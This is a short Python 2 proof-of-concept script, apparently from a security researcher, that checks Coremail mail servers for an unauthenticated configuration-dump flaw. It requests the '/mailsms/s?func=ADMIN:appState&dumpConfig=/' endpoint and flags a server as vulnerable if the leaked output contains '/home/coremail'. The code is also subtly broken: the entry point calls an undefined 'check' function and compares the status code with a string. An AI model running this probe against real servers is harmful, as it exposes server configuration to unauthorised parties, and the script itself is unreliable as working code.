#-*- Coding: utf-8 -*-
#Author: Al1ex@Heptagram
#About: Coremail EXP

import requests,sys

def mailsmsPoC(url):
    url = url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    r = requests.get(url)
    if (r.status_code != '404') and ("/home/coremail" in r.text):
        print "mailsms is vulnerable: {0}".format(url)
    else:
        print "mailsms is safe!"

if __name__ == '__main__':
    print """
  ____               __  __       _ _ 
 / ___|___  _ __ ___|  \/  | __ _(_) |
| |   / _ \| '__/ _ \ |\/| |/ _` | | |
| |__| (_) | | |  __/ |  | | (_| | | |
 \____\___/|_|  \___|_|  |_|\__,_|_|_|
                                      
    """
    try:
        check(sys.argv[1])
    except:
        print "usage: python poc.py http://ServerIP:Port"